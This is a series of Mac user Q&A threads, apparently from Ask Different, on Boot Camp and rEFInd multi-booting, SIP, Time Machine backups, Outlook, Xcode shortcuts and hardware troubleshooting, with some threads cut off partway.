mentioned that while macOS and Ubuntu are free software, Windows is not and you'll have to figure out a license.\n\nA: I do not have the time to create detailed instructions. However, I will document the steps I believe are necessary to install Windows 10 on your machine. These instructions have not been verified.\nBasically, these instructions are based on my answer to the posted question: No bootable device USB 2.0 MacBook Pro mid 2014. You will need to convert the macOS commands to the Ubuntu equivalents.\nThe website Download Windows 10 Disc Image (ISO File) can be used to download Windows 10. You should choose to download an iso file. You can use this file to install Windows 10. At some point after installing you will need to buy a license to continue to use Windows 10.\nYou will need to modify the steps as follows.\n\n\n*\n\n*You will need to download the 32 bit Windows 7 Boot Camp Support Software. Windows is designed to use old drivers when newer ones are not available. I used the same download to install 64 bit Windows 10 on a 2007 iMac. \n\n*Step 9. You will need to clone the BOOTCAMP partition to the beginning of the drive. Do this after first booting to the BOOTCAMP partition. This will require destroying the Ubuntu installation. Once the new partition is complete, reboot to the new partition and destroy the old partition. Reclaim the free space. Continue with step 9.\n\n*Step 9. Since you do not have macOS (OS X) installed, you may need to hold down the option key during restarts and manually select the boot volume.\n\n*After the BCSS is installed, goto the Control Panel and open the Boot Camp pane. Select Windows as your startup disk.\n\n\nOf course, installing Windows is easier if you choose to use your optical drive. You will also need a flash drive to hold the BCSS. You may need a machine running Windows to modify the Windows iso file. I would first try burning the iso to a DVD and test to see if you can boot. If not, then the instructions for modifying the iso file are given at the website: Select CD-ROM Boot Type:” error during Windows install. \nAnother option would be to install a 32 bit version of Windows 10 using the optical drive. Although this is the simplest way to get Windows 10, I believe it is worth the time to try to get 64 bit Windows running.\nI assume I left out some important instructions. If you get stuck, let me know.\n\nA: *\n\n*Install the Bootcamp support software in compatibility mode for Windows 7 or \"previous version of Windows\", execute the program titled \"BootCamp64\" under the path /Drivers/Apple. I used the OS X 10.5 Bootcamp software that were on the DVDs that came with my Mac, Bootcamp version 2.0. Keyboard functions such as brightness and volume control worked for me after installing this.\n\n*Go to Dell support and download Dell Wireless WLAN 1397/1510 Half Mini Card Driver , they are the same chipset as the Airport extreme card I had, install in compatibility mode, or try installing via device manager manually after extracting the driver files to a folder. Don't use the built-in Broadcom 802.11n WiFi drivers, they are horrible. These drivers are a perfect match.\nGood luck!\n", "Q: Can I simply make a partition on my Mac, install an OS to it, and boot from it via Startup Manner? On my Mac, can I simply create a new partition in Disk Utility, install an Operating System to it, such Arch Linux, and then boot from it by holding alt/option during boot (Startup Manager)?\n\nA: I don't think so. On my Mac, even though I don't have OS X (I think its all the same though) you don't have to use option to boot into Ubuntu, but any other OS like OS X you will have to use Option to boot into it.\nEDIT : Ubuntu or anything like Linux WILL NOT show up in the Option menu. It just boots straight away to Ubuntu.\n\nA: Yes, except the last one:\n\nand then boot from it by holding alt/option during boot\n\nOnly Mac operating systems and sometimes Windows will show up in the menu. Instead I would suggest installing rEFInd. I have used it to dual boot Kali Linux and macOS Sierra on my MacBook Pro.\nVery simple to install and use except you will need to turn off SIP for the installation process.  You can turn it back on after.\nTo Disable SIP:\n\n  \n*\n  \n*Reboot your Mac into Recovery Mode by restarting your computer and holding down Command+R until the Apple logo\n  appears on your screen.\n  \n*Click Utilities > Terminal.\n  \n*In the Terminal window, type in csrutil disable and press Enter.\n  \n*Restart your Mac.\n  \n\nInstall rEFInd\nEnable SIP\n\n  \n*\n  \n*Reboot your Mac into Recovery Mode by restarting your computer and holding down Command+R until the Apple logo\n  appears on your screen.\n  \n*Click Utilities > Terminal.\n  \n*In the Terminal window, type in csrutil enable and press Enter.\n  \n*Restart your Mac.\n  \n\n", "Q: MS Office default window size for existing documents Where can I set (or reset) the default Window Size for an MS Office Document?\nI'm on OSX High Sierra using Office 2016, and when I open a Word or Excel file from Finder, it opens on a small window, less than 25% of screen size. I can easily resize it, but if I close it and reopen, it opens small again.\nI've found answers that involve editing the default template (.dot), but this seems to apply only to new documents. I want to change the windows size for any document.\nThanks!\n\nA: Try this...open Word, open a new document, size it the way you want it, then Quit Word.

If I select a found file I see the full path in the Path bar at the bottom of this Finder window. (See the first screenshot.)\nBut when I do the exact same search command in High Sierra on this SMB fileserver, I see the same search results. But when I select a found file in these search results, I don’t see the file path. In stead of that I see only the icon of the file. (See the second screenshot.) Also the found files are showing blank file icons.\nWhen I perform in High Sierra a search command on the internal drive or a USB stick the full path of the found file is visible.\nI guess the absence of the file path in High Sierra has something to do with the SMB protocol.\nApple has discarded the AFP protocol in High Sierra and uses SMB instead. Yosemite still uses AFP so i guess thats why the full file path is showing.\nMy question: is it possible to make the full file path visible again in High Sierra when selecting a file in the search results on a SMB server?\n\nA: Either this was a bug that is fixed in 10.13.4 or the upgrade and restart has fixed this.\nIf you can run a reinstall of your OS in cases like this, it might help.\n", "Q: Don’t recall password in iCloud on iPhone 6.

suspect you have the D300 GPU. The GUI freeze is a known problem for the Mac Pro (2013) with this GPU – at least in the community (see this MacRumors forum thread). Apple never acknowledged it and it's very hard to reproduce.\nIt's basically a hardware problem that occurs mostly when doing hardware video decoding or 3D graphics.\nWhen running windows, there's a short blackout but the system doesn't lock up. Under more recent macOS versions, the GUI freezes.\nSince macOS 10.13.4, sometimes there are at least panic logs and Crash Reporter allows sending them to Apple. Let's hope they'll take a look and fix their driver.\nWhat you can do once your GUI is frozen:\n\n\n*\n\n*Connect to your Mac using SSH (needs to be set up beforehand) and reboot it that way\n\n*Using the key combination Control–Command–Media Eject to reboot your Mac more or less gracefully (as documented here)\n\n*Hold the power button (as you do) to forcefully shutdown the system\n\n\nA: What do you mean by MacOS crashes? As in the machine shuts off automatically for no apparent reason? The OS freezes or becomes almost unusable and you need to unplug it? If MacOS shuts off on its own while you're doing something, it may be a PSU problem and probably cannot be fixed with software unless you wanted to dualboot Windows, undervolt or underclock your processor with XTU or something, and return back to MacOS and see if the issue if gone. If it's the second one, then your fans may not be functioning properly and the CPU is just doing a fallback procedure and limiting its clock speed to somewhere under half a GHz. Both options should be able to be resolved at an Apple Store near you, unless you have been using the Mac Pro for 5 years. \n", "Q: Does iCloud Drive backup hidden dot folders/files such as .git? The folders/files don't show up on www.icloud.com so I presume I would need a second machine to verify via terminal.\nCan anybody test this?\n--\nI'm specifically trying to ensure that my local .git file is backed up as I'm keeping this project local (not pushing to GitHub). I've tried chflags nohidden .git in my repo dir but that doesn't cause it to show up.\nSeems like there's no way to \"unhide\" \"dot files\" such as .git so that they appear in Finder (even if you remove their hidden flag - confirmed via ls -alO).\nI also tried creating a symbolic link using ln -s .git dot_git which did not show up on iCloud.com.\n\nA: I've decided that because I can see the files within my iCloud folder in Finder by unhiding all hidden files, they are also backed up.\nConfirmed with colleague that .git folder persists across machines!\n", "Q: How to inherit sparsebundle on macOS Server Time Machine service? I am using macOS Server's Time Machine service to centralize backups for my mac workstations/laptops. One of the laptops hasn't been backed-up since upgrading to a new MacBook Pro (using Migration Assistant) 6 months ago. I'm now connecting the laptop Time Machine to the server, but instead of using the old backups with the same name, it's creating new ones with a \"1\" at the end of the name (e.g. MacBook Pro 1 when the name of the existing backup and mac is MacBook Pro).\nHow do I force Time Machine to use the existing backups so that we may keep all the backup history?\nFor what it's worth, I believe the macOS Server Time Machine service is no more than a SMB share from the laptop's perspective.\nI have seen posts on how to do inherit a Time Machine backup on a locally attached drive, but I'm not sure how to do this on a remote sparsebundle.\n\nA: As it turns out, it is super easy with a single Terminal command.\nFirst, you need to mount the Time Machine share using Finder. Just browse to the server, then to the share so that it mounts. I mounted with Admin privileges since Admin owns the the Time Machine sparsebundle.\nThen, you open Terminal and run this command:\nsudo tmutil inheritbackup \"/path/to/backup.sparsebundle\"\n\nFor example, mine would be:\nsudo tmutil inheritbackup /Volumes/Time\\ Machine/MacBook\\ Pro.sparesebundle\n\nIf your prefer to use quotes intead of the space escape, you should be able to do:\nsudo tmutil inheritbackup \"/Volumes/Time Machine/MacBook Pro.sparesebundle\"\n\nYou will need to enter your Admin password, and that should do it.\nI rebooted after this, then selected the backup share in Time Machine and now it's using the existing sparsebundle instead of creating a new one.\n", "Q: Need a bootable OS X installer iso I removed the OS X partition off my HDD and installed Ubuntu. Now I want OS X back but I can't install it considering I have no access to Mac OS X. I need either an OS X Snow Leopard or OS X Lion .iso so I can put it on an installer USB.\n\nA: Since OS X Lion was around $30 USD on release you definitely, definitely wouldn't want to torrent the .iso. I would image you could find the torrent fairly easily if you were to look. But you wouldn't do that, would you, because that would be immoral and possibly illegal in your area.\n\nA: Apple still sells Snow Leopard 10.6.3 install disks for $20 US, shipping included.  That's probably your least annoying, least dodgy/insecure recourse for getting Mac OS back onto your Mac.  \nEven if you decide you don't want to use OS X ever again, it's a good idea to keep a small Mac OS partition on the hard drive - for one thing, the Mac system settings app is the only way to change certain hardware settings such as \"resume after power failure.\" It's pretty straightforward to shrink the partition down to around 10 gb, which isn't too much space to sacrifice for the safety net it provides.  \n\nA: Mac OS X 10.5 Leopard installer download link:\nhttps://archive.org/details/OsxLeopardInstall\nMac OS X 10.6 Snow Leopard installer download link:\nhttps://archive.org/details/SnowLeopardInstall\nMac OS X 10.6 Snow Leopard Server installer download link:\nhttps://archive.org/details/SnowLeopardServer\nNote: Archive.org is a legitimate, non-profit site which keeps archival copies of various websites, software, and media for historical and educational purposes.\n", "Q: How can I get hardware schematics for Mac computers? I'd really like to have hardware schematics (circuit diagrams for motherboards etc.) for Mac computers, as they might help me to repair them.\nAny clues as to how can I get them?\n\nA: \nhttps://www.apple-schematic.se/ This Website Would Help and Please Tell your Model for which you want schematic .\n\n\nA: Apple publishes repair manuals for new hardware and official parts and tools orders are also available.\n\n*\n\n*https://support.apple.com/manuals/Repair\n\n*https://www.selfservicerepair.com/home\nCircuit diagrams will need to be generated outside Apple. Their “repair manifesto” paper explains in detail how they arrived at a decades-long service swap philosophy with repair depots doing all board level repairs and technicians doing board level swaps.\n\nBoards are packed with many small components necessary for the device’s proper functioning. For example, ball grid array (BGA) parts require specialized equipment for their repair that is restricted to factory or advanced repair environments due to its cost and complexity.\n\n", "Q: Triple boot macOS High Sierra, Linux Mint, and Windows with rEFInd I have a MacBook 2015 running macOS High Sierra 10.13.4,I installed Windows 10 using Boot Camp. After that I created two partitions swap,root   to do installed Linux Mint. Finally I installed rEFInd to manage the three OS's,  but where reboot I can't access Windows. It's show message error \"rEFInd - Booting OS Starting bootmgfw.efi Using load option '' BlInitializeLibrary failed 0xc00000bb \", How to fix it?\n  \n\nA: I will formalize @luctp's answer seeing as the user is gone and I have (sort of) confirmed that the instructions work:\nSo here's how the error looks like, when trying to boot Windows from rEFInd:\n\nThe steps below will make the error 0xc00000bb effectively disappear and, for @luctp, seemed to be enough to fix the triple boot. However, in my case, more work had to be done as I explain at the end of the answer.\nTo get rid of the 0xc00000bb:\n\n\n*\n\n*Download and install gdisk.\n\n*Disable SIP, otherwise you get error the following error when running gdisk: Problem opening /dev/disk0 for reading! Error is 1.\n\n*Create a new Protective MBR for your disk using gdisk, start by running on the terminal: sudo gdisk /dev/disk0\n\n*(Optional) Choose \"p\" to have a look at your current GPT partitions, and potentially create a backup of them. Also look here for better ways of backing up the partition table.\n\n*Choose option \"x\", then option \"n\" to request the creation of a fresh Protective MBR, then option \"w\" to write the requested changes to the disk, confirm with Y and exit the tool with \"q\".\nAfter the steps above, Windows 10 should indeed start booting (whereas before it would simply get stuck in rEFInd).\nIn my case, however, the Windows 10 EFI boot splash would show on the screen for a few seconds and then suddenly reboot.\nWhat ended up being the solution for having a working triple-boot in my Mac was following David's Alternative Second Answer, specifically the \"The First Way\". Now, I can boot to any of the three OSs. Not only that, but I can boot them from either rEFInd directly or through GRUB (for Ubuntu/Windows) after rEFInd or after pressing the Option key on boot.\n", "Q: MacOS High Sierra - How to format readonly pendirve?

You need to go to the Apple store as you have already tried hard rest .\nyou can follow this guide also :- \n\nhttps://www.ifixit.com/Answers/View/161982/ipad+2+-+My+screen+is+blue+after+falling.                                \n\n", "Q: App not showing up on the home screen I happened to download an app and it got completely downloaded (yes, its showing “open” next to the app in AppStore) but somehow its not showing up on the Home screen.\nPoints to consider:-\n\n\n*\n\n*I have not applied any restrictions to download any of the apps in Settings>General>Restrictions.\n\n*The app is accessible from the AppStore and shows up in the spotlight search only the icon doesn’t show up anywhere no the phone’s screen.\n\n*Yes I have completely checked in all folders and screen menus, but couldn’t find the app icon.\n\n\nWhat steps need to be taken?\n\nA: This can happen for a number of reasons and you might not know why.\nFirst, do the easy stuff, like you already did.  Search with Spotlight, check for a new Home screen by swiping to the right, and check all your folders.\nIf those don't work, try a hard reset.  After you restart the iPhone, search for the app again.\nIf the app is still missing, delete the app and reinstall it from the App Store.  To delete the app (in iOS 11), go to Settings -> General -> iPhone Storage and find the app.\nTap the app and on the next screen select Delete App.  \nAfter the app's deleted, go back to the App Store and redownload the app again.  Hopefully, it will install correctly this time and you'll be able to see it on a Home screen.\n\nA: For iOS 14, Go to Settings > Home Screen  and for \"Newly downloaded apps\", select Add to Home Screen.\n\nA: In iOS 15, there is a setting to not show newly downloaded apps in the Home Screen and instead just show them in the Apps Library.\nCheck in the App Library by searching for your missing app. If present you can drag it to the Home Screen. If that was the problem you can revert the setting in Settings > Home Screen & Dock.\n\nA: Do the Home Screen Layout Reset:\nSettings -> General -> Reset -> Reset Home Screen Layout -> Reset Home Screen\nHope this will others also.\nSource\n\nA: This happened to me and I finally found the app where I had embedded it two folders deep. Remember that home screens can have folders within folders.\n", "Q: Compression / archival utility which stores the most metadata? I recently did a backup of a FAT32 disk which contained a lot of diverse data. It contains many media files, many big binary files, and as usual with FAT32, it has all kinds of odd (but potentially important) permissions for all of these different files. The whole directory of this backup weighs in at a few hundred GB. I would like to have a compressed archive of this backup, but I have a few requirements from whatever archival utility that I use:\n\n\n*\n\n*It needs to preserve extended attributes\n\n*It needs to preserve timestamps\n\n*It needs to preserve permissions\n\n*I would like for it to preserve as much metadata as possible\n\n\nI know that there are many different archiving utilities which fit at least some of my needs, but I would like to know of one which fits them all. I.e., which one can maintain the most metadata and also (preferably) has a good compression ratio for a diverse data set.\n\nA: If it's FAT32, use 7zip. Turn on the \"slower but more effective\" options, which use a larger dictionary. The results can be spectacular; I use it to move database backups around machines and I often get 96% compression.\n\nA: To preserve everything a Mac sees on the volume I'd suggest you make a compressed disk image with Disk Utility. Launch Disk Utility, select your external volume and select File/New Image from \"Volume\" or File/New Image from Folder and choose the compressed image format. It will definitely store everything and is the same underlying mechanism Time Machine uses when making a backup to a network destination.\n", "Q: Possible to link mouse buttons to macOS functions I've just taken delivery of a new mechanical keyboard and laser mouse as I wanted to switch off the Bluetooth on my MacBook Pro (early 2013 Retina, running High Sierra).\nAll is working nicely with the Mac except I've lost the gesture control which I use a lot to switch between VMware virtual machines.\nThe laser mouse is a gaming mouse (HyperX Puslefire FPS) with a couple of extra buttons and I'd like to assign these buttons to switch desktops.\nDoes anyone know how I can do this, ideally without 3rd party software, using automation or similar?\n\nA: It's no doubt possible to map your mouse buttons to Keyboards keys, but considering the generic nature of your mouse, I'm doubtful you'd be able to do it without 3rd party software.\nWhile I haven’t used these to map buttons to a HyperX Pulsefire FPS gaming mouse, I have used these to map the buttons from a variety of other controllers:\n\n\n*\n\n*USB Overdrive \n\n*ControllerMate\nI’d start with USB Overdrive as it offers a much simpler interface. ControllerMate provides a lot more advanced functionality, but also takes quite some time to suss out.\nNow, I haven't used SensibleSideButtons, but that may work in your scenario if the extra buttons are side buttons. Nor have I used Steer Mouse, but I know of people who swear by it.\n", "Q: MacBook Pro fans are loud after partitioning disk for Boot Camp use After installing Boot Camp on my MacBook Pro 14,1 the fans in my computer started to make loud sounds like squeezing a plastic bottle every time when it runs at high speed.\nAfter sending it to a service center, an engineer told me it is because I partitioned my disk for Boot Camp and because of that it makes it harder for the computer to read the disk, so it needs more energy and this causes the fans to run at higher speeds.\nMy question is here: Is it safe to install Boot Camp (dual boot or triple boot) on my MacBook?\n\nA: Is it safe? Yes. \nThe 2017 MacBook Pro (13-inch, 2 x Thunderbolt 3 ports) is more than capable of running the latest 64-bit versions of Windows 10 installed with Boot Camp. \nUnfortunately it's difficult for anyone here to speculate on what the Engineer meant, except to say that it seems something has been lost in how they've explained it to you.\nHowever, since Boot Camp is provided by Apple and Boot Camp Assistant software is included with macOS, you know it's safe to use. \nAs for your description of the loud sound the fans are making, it's not clear from your question whether your fans are always loud or only when you're trying to do certain things. However, the first thing I'd try is resetting the System Management Controller (SMC).\nHow to reset the SMC on your particular MacBook Pro\n\n\n*\n\n*Shut down your MacBook Pro\n\n*For 10 seconds, press and hold at the same time the shiftcontroloption keys (on the left side of the built-in keyboard) and the power button\n\n*After 10 seconds let go of all keys and the power button \n\n*Turn your MacBook Pro back on with the power button\n\n\nAfter your MBP reboots, test to see if the fans are still making the same sound.\n", "Q: multi-home High Sierra and block one address? I run Apache on my Macbook Pro for off-line use of a web app.  But for \"self-defense\" online, I use /etc/hosts to map certain hostnames to 127.0.0.1 which means if a webpage causes a GET to one of these, it hits my local webserver instead.  \nI would rather they do nothing.  If I point them to an address that I know is unreachable, e.g., 10.250.250.250, then a poorly designed web page may not render until the GET times out.\nIn 10.13.4, how do I (Can I) point them to a separate private address that will be handled on the Macbook and set that address to immediately reject everything?  (Without changing how loopback behaves.)\n(By the way, Apple documentation has long claimed that /etc/hosts is only used in single-user mode.  I have found that to be false on many versions of OS X/MacOS.)\n\nA: The easiest way to achieve a guaranteed reject with no timeout is to use a broadcast address 255.255.255.255. Edit your /etc/hosts file and for hosts that you want request rejected put an entry such as:\n255.255.255.255  rejectedhost.com\n255.255.255.255  someotherhost.net\n\nThis free and simple technique can also be used to block out advertisement hosts on ad-ridden or popup-ridden web pages.\n", "Q: Can I get my Touch Bar to play sounds to acknowledge my Touch Bar key presses? I love my MBP and the Touch Bar is pretty cool, but sometimes I find I’m second-guessing myself. Did I press the ESC key or not? Did I press that function key? Well you get the idea. There’s just no physical feedback and sometimes I keep tapping where I think something is, but it’s not!\nI know there's no tactile feedback, but then it hit me - maybe there’s a setting somewhere for sound. You know, like the beeps you here when pressing buttons on some devices.\nMy guess is this is just not possible, but before I make the suggestion to Apple I wanna make sure!\nAny ideas?\n\nA: Actually you’re in luck. A while back I came across Haptic Touch Bar. \nThis software not only offers the sound feedback you’re looking for, but actually provides tactile feedback by activating the trackpad magnets to vibrate the MBP when you're using the Touch Bar.\nNOTE: I am not affiliated with the developer or this software in any way.\n\nA: There is a FOSS alternative out there: HapticKey.\nThe latest release can be gotten on Homebrew:\nbrew cask install haptickey\n\nSimilarly as Haptic Touch Bar this software will both enable tactile feedback and sound.\n", "Q: Prevent closing of entire Xcode window on Command-W when \"Quick Open\" menu is open I have an Xcode window open with many tabs. I want to open a file through Quick Open (⇧⌘O).\nWhen I decide to close the Quick Open menu and also close the current tab that I'm on, I'll press Esc to close the Quick Open menu, and then press ⌘W to close the tab. However, sometimes I make a mistake and press ⌘W on the Quick Open menu, which causes the entire Xcode window to close instead.\nIs it possible to prevent this behaviour? Maybe prevent ⌘W from doing anything when Quick Open is open?\n\nA: Here's how you unset the keyboard binding for Close Tab aka ⌘+W. \n\n\n*\n\n*From Settings.app -> Keyboard -> Shortcuts -> App Shortcuts tap the + button\n\n*From Application dropdown select Xcode\n\n*Enter Close Tab for the Menu Title \n\n*set any keyboard shortcut you like\n\n\n\nThis un-maps ⌘+W shortcut in Xcode app completely. After this you are free to remap the ⌘+W key bindings in Xcode.\nIn my case I like ⌘+W to close the document so from Xcode -> Preference -> Key Bindings I have these changes (In your case you can bind Ctrl + ⌘+W to Close Tab instead and leave Close Document unmapped).\n\n\nA: The first thing that comes to mind is to change the default ⌘W behaviour in Xcode so that it doesn't close the entire Xcode window.\nYou can do this via Xcode > Preferences > Key Bindings.\nIt may be worth exploring all of the options there. One safe way to do that would be to create a duplicate of the Default Key Bindings set and modify that. More specifically:\n\n\n*\n\n*Launch Xcode\n\n*Go to Xcode > Preferences > Key Bindings\n\n*Click on the Key Bindings Set drop-down menu and select Manage Key Bindings...\n\n*Now click on the plus (+) option at bottom left of the window\n\n*Select the Duplicate \"Default\" option\n\n*Give the set a name and click Done\n\n*Now change the keyboard shortcuts you want and test whether you can get things to work as you'd like\n\n\nOnce you're happy you can exit Xcode preferences. This approach is safe because you can always return to your Default set whenever you want.\n\nA: Looks like this is solved with Xcode 11! ⌘W doesn't do anything when Quick Open is active now.\n", "Q: iMac 21.5” mid-2010 SATA Specification Does the 21.5” mid-2010 iMac support the full 6 Gbps SATA III standard?\n\nA: Your systems SATA port is only SATA II (3.0 Gb/s) .

Rather than having to hold the option key ? \nIm using OSX 10.10\n\nA: Sam, I don't think it's possible without a third party app. As mentioned by @Tetsujin, there is a native shortcut for moving a file Cmd+C and Cmd+Alt+V, but if you don't wish to use shortcuts, you may have to use a third party app.\nI guess you could make an Automator Service, but you'd have to access it from the  \"Services\" submenu thing and I feel it would be more of a hindrance than a real solution. \n3rd party applications that add \"Cut\" to the context menu:\nAll of these applications use the same logic as Windows, when it comes to moving files this way, which is to say backwards from how it works in macs: You start with the intent to \"Copy\" or \"Cut\" file(s) and then just normally \"Paste\" to complete the action. Cutting = Moving.\nShould be noted that from 10.11. onward XtraFinder and TotalFinder become more difficult to run, as they need to inject code to Finder and SIP is not into that.

After the upgrade, the laptop was running smoothly during about 1 week. \nThen, performance suddenly dropped and all menus now take a while to open.\nThe mouse cursor is very jerky. The one of the touchpad is also jerky, altough to a slightly less extent. Practically, it is impossible to use the laptop.\nThe battery is no longer charging and the time (date/hour) is no longer remembered, so that I have to reset it after each start of the OS.\n(skip)\nSpecifications : Processor i7 @ 2,3 GHz with 4 GB RAM\n(skip)\n\nUpdate 1\n\n\n*\n\n*Upgraded to 8 GB RAM. \n\n*Shrinked OS partition. \n\n*Cloned to SSD.  \n\n*Checked SMART values.  \n\n*Checked file system.\n\n\nProblem not solved.\n(skip) \n\nUpdate 2\nShort version:\nThe culprit is the low battery\nAfter thorough tests, I came to the conclusion that the jerky cursor movements and the MacBook coming slower and slower was caused by the battery with \"replace now\" status.\n\nLong version or how the problem has been identified. \nI first followed this procedure in the comments of a video showing how to fix battery issue on a MacBook: \n\n\n*\n\n*Power off computer\n\n*Remove battery \n\n*Disconnect magsafe \n\n*Connect magsafe \n\n*Connect batte\n\n*Power on\n\n\nThis had the positive effect that afterwards, the date/time were remembered, although the battery was in very poor (\"replace now\") condition.\nThen, I reset SMC and NVRAM, following the procedures linked by users Nimesh Neema and Amey. The problem remained. The MacBook was fast during the first seconds and then went slower and slower. This happened even when using softwares from Apple only and not from third-parties.\nLastly, I tested the MacBook with the battery from a 13'' inch (A1278) MacBook Pro. Both batteries operates at the same voltage (although thus of the 15'' has higher capacity). The battery connector is not a the same location, but is same, so that I could insert it and hold the battery with my hand.\nThis battery was in better condition (with \"must be checked\" status, but didn't had yet the \"replace now\" status. This totally solved the problem. The MacBook remained fast and the cursor movements, from the touchpad or mouse were still smooth after several minutes.\n\nConclusion: If the battery has the \"replace now\" status, some artifacts totally paralyze the MacBook Pro, although it appears working correctly during the first seconds. This is a purely hardware problem and system reinstall or upgrade is NOT necessary. \n\nA: *\n\n*Perform Apple Hardware Test to check for any hardware failures. To do so, power up your Mac, then immediately press and hold the D key. Keep holding the key until you see the Apple Hardware Test icon. Thereafter follow the steps as mentioned in the support article, How to use Apple Hardware Test on your Mac.\n\n*Reset SMC and NVRAM.\n\n*If the hardware test passes, try reinstalling OS X El Capitan.

It's when the temperature of the components are lower than the dew point of the ambient air that it will become a concern; water will condense.\nRunning the computer won't keep humid air out as it's the ambient air that gets circulated.

Do you ever see any message repeated?\n\nA: In case anyone else runs into this problem, I found the cause and figured out the solution and am sharing.\nThe Cause\nYou'll run into this with Outlook for Mac 2016 and any Gmail account.  \nThe reason why Outlook for Mac 2016's SmartFolder behaves this way is because it is searching on every folder (as one would expect).  What I didn't consider was that Google has an Inbox folder and an All Mail folder.  When you add a \"Folder\" column to the view, you'll notice this.  \nThe Fix\nTo avoid the duplication, you need to update your Smart Folder search so that it excludes the All Mail folder of each Gmail account.  The image below shows my Outlook for Mac 2016 with four (4) Gmail account All Mail folders excluded.\n \nIf you're not sure how to do this, Click your Smart Folder (or click the upper right Search box and type something and then save to create one).  \nClick Advanced and then add the following search parameters:\n\"Read Status->Is->Unread\" \nClick + \nSet the next parameter to:\n\"Folder->Is Not->Choose Folder\".  Once you click Choose Folder, a Window opens (titled Window) with a search field. In the search field, type in All and you'll see the All Mail folder.  Select it.\n\nIf you have more than one account, repeat this with each account. \nClick Save Search once you're done.  \nNow you're Smart Folder will work if you're using Gmail.\n", "Q: Is \"server performance mode\" enabled or not? When experiencing some MAJOR file sharing slowdowns in a new macOS High Sierra machine running Server.app I came across this page from Apple showing how to enable \"performance mode for macOS Server\".\nhttps://support.apple.com/en-us/HT202528\nSome online resources make reference to the \"old\" procedure before SIP prevented that from working, and provided instructions on how to turn off SIP and then use \"serverinfo\" to enable perfmode, and then turn off SIP.\nReferences at No boot-args in nvram and What does serverperfmode=1 actually do on macOS? gave me some more information, but I cannot find info about checking the perfmode status in High Sierra.\nI have set the NVRAM variable like Apple says, and checking it returns the proper result of \"boot-args serverperfmode=1\" and I restarted a few times, but \"serverinfo --perfmode\" still returns the result of \"Server performance mode is NOT enabled.\" \nWhen set via the NVRAM, should \"serverinfo --perfmode\" tell me that performance mode is enabled? If not, how can I tell if it has been enabled? The NVRAM variable essentially says \"turn it on when you boot\", but it does not tell me \"it got turned on when I booted\".\n\nA: OK, I guess I have one way to determine based on What does serverperfmode=1 actually do on macOS?\nIf you take the output from sysctl -a you can search it for some of the items listed above and see what their values are.\nsysctl -a > temp.txt\nSearch temp.txt with your favourite editor and look for kern.maxvnodes, if it is 300000, and if kern.maxproc is 5000, then you are in \"performance mode\".\nOr at least some of your settings match the \"performance mode\" settings.\nSince I did both the NVRAM variable and the \"disable SIP and use serverinfo --setperfmode 1\" methods, I don't actually know if the NVRAM method by itself results in the changes for High Sierra.\n\nA: According to this article you must disable SIP:\n\nIf you are using OS X 10.11 El Capitan or greater, you will need to\n  disable SIP (System Integrity Protection) first.\n  Check if your server is running in performance mode with\nserverinfo --perfmode\nIf you find its NOT, its generally a good idea to enable it as\n  performance mode tunes the system to run as a server.\nYou can do so by issuing:\nserverinfo --setperfmode 1\n  When done, reboot.\n\n", "Q: Alias - 'Show Original' in new tab Update:\nAfter the two answers so far I have moved the goalposts slightly.

In settings, message forwarding is disabled on both devices and “Send & Receive” address sets for each device are mutually exclusive (no address is enabled for both the SE and the 7).\nThe conversations which get forwarded seem random, with no relationship to how many people are in the conversation, which contacts are involved, who in the conversation (if anyone) is using SMS protocol, or to which phone the conversation is supposed to go; but either all messages in a given conversation are forwarded to the other phone, or none of them are.\nNone of the other devices on this Apple ID seem to be affected.\nAttempted Solutions\nFirst off, I read all of the official support pages for the Messages app that I could find, plus some discussions (this, this, this, this, and this on the Apple community forums, and this, this, this, and this on Ask Different). I also went through an ioshacker article and an imore article that looked sort of relevant. None of this taught me anything new, so I just started trying things.\nFor each phone, I have:\n\n\n*\n\n*Permuted all of these actions:\n\n\n*\n\n*toggled “Send & Receive” addresses and then returned these to the desired values (this approach worked for a similar problem in iOS 10)\n\n*toggled handoff on and back off again\n\n*toggled message forwarding on and back off again (this is the first time I’ve ever turned that setting on)\n\n*toggled “Calls on Other Devices” in “Phone” settings and all FaceTime addresses for good measure\n\n\n*Deleted conversations on whichever device wasn’t supposed to receive them.\n\n*Restarted the devices.\n\n*Reset settings.\n\n*Repeated steps 1–3.\n\n*Crossed my fingers and hoped really, really hard (I’m quite serious).\n\n\nOn the SE, I have also turned iMessage off and back on again, and logged out of the Apple ID and back in.\nOther Notes\n\n\n*\n\n*I don’t have enough running message conversations to do any sound statistics on them.\n\n*I don’t want to disable iMessage as a long-term solution because (and this might sound stupid) I find the green bubbles stressful.\n\n*I’ve gotten myself locked out of another Apple ID account trying to fix a similar issue with app syncing, so the “use a different Apple ID for each phone” solution is a last resort, but I am aware that it exists.\n\n\nA: The solution appears to be “wait a few months and let Apple deal with it.” This is underwhelming and probably unhelpful to anyone else who stumbles on this question, but it doesn’t seem like that’s a whole lot of people.\n", "Q: Keynote: trying to add hyperlink, but no field to add the URL I'm trying to add a hyperlink to an image in a slide.

I recently purchased the new macbook and when comparing it to my 2013 macbook retina, the newer model is much dimmer, it was as if I downgraded.

I'm about to register to the 99$ Apple Developer Program.\nIf for a reason Y or Z, the app is rejected from AppStore, can I ask a cancellation and refund of the Developer Program?\nThe reason is that it wouldn't be useful to stay on Developer Program if the app is not accepted.\nNote: If needed, I would do the cancellation before 7 days after the subscription to the Developer Program. (In Europe, or at least some countries, there is a right of withdrawal/cancellation up to seven days after an online purchase).\n\nA: In general, there are no refunds of the Apple Developer program yearly fee.  I've been in the program for several years and I've never heard or seen a refund given because an app was rejected.\nThe reason being is that all app policies are public and available for you to review prior to determining you want to pay the fee and submit the app.  I would recommend that you do that first and see if your app idea is viable.\nJust because you think the app will be accepted doesn't mean Apple can't reject it later for whatever policy they think you violated.  In that case, you can always contact Apple and appeal the rejection. \nI don't know if the 7-day cancellation you mentioned would be applicable in this case because you're not making a product purchase; you're paying a membership fee. \n", "Q: Black screen with cursor after logging out of guest account on High Sierra When I log out of my guest account, it gets stuck with a black screen and a cursor that I can move around but can't do anything except do a forced restart. In my searching, I have seen an old recommendation to remove the /Library/Preferences/com.apple.loginwindow.plist file (that didn't work for me). I've also seen that someone disabled System Integrity Protection with csrutil disable.\nI looked in the Console after restarting and saw the following line:\nApr 24 12:45:55 my-computer com.apple.xpc.launchd[1] \n (com.apple.xpc.launchd.user.domain.201.100028.Aqua):\n Caller not allowed to perform action: loginwindow.1627,\n action = service removal, code = 150:\n Operation not permitted while System Integrity Protection is engaged,\n uid = 0, euid = 201, gid = 201, egid = 201, asid = 100028\n\nThis mentions both loginwindow and System Integrity 